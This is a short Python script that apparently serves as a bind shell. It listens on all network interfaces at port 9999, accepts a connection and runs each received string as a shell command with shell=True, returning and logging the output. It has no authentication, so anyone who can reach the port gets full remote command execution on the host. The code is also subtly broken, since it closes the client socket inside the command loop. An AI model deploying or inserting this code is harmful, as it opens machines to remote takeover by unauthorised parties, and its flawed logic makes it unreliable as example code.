import socket
import subprocess
from logger import logger

# Define the server address and port
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 9999

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the address and port
server_socket.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server_socket.listen(5)
print(f"Listening on {SERVER_HOST}:{SERVER_PORT}...")

# Accept a client connection
client_socket, client_address = server_socket.accept()
print(f"Accepted connection from {client_address}")

# Main loop to receive and execute commands
while True:
    # Receive the command from the client
    command = client_socket.recv(1024).decode()
    
    if command.lower() == 'exit':
        print("Exiting...")
        break

    # Execute the command
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        output = output.decode()  # Decode byte string to a regular string
        output = output.replace('\r\n', '\n')  # Replace \r\n with \n for better readability
        logger.info(f'SUCCESS:{output}')
    except subprocess.CalledProcessError as e:
        output = e.output
        output = output.decode()  # Decode byte string to a regular string
        output = output.replace('\r\n', '\n')  # Replace \r\n with \n for better readability
        logger.info(f'EXCEPTION:{output}')
    
    # Send the output back to the client
    client_socket.send(output.encode())
    client_socket.close()

# Close the client and server sockets
server_socket.close()
